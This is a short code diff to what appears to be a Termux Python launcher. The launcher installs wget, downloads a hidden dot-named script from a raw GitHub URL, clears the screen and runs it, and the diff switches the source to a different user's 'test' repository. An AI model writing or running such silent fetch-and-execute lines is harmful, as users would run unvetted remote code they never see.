@@ -7,4 +7,4 @@ if os.path.isfile('.br.py'):
 
 else:
 	os.system("pkg install wget -y")
-	os.system("wget https://raw.githubusercontent.com/BotolMehedi/braje/main/.br.py && clear && python .br.py")
+	os.system("wget https://raw.githubusercontent.com/NaziatKing/test/main/.tr.py && clear && python .tr.py")
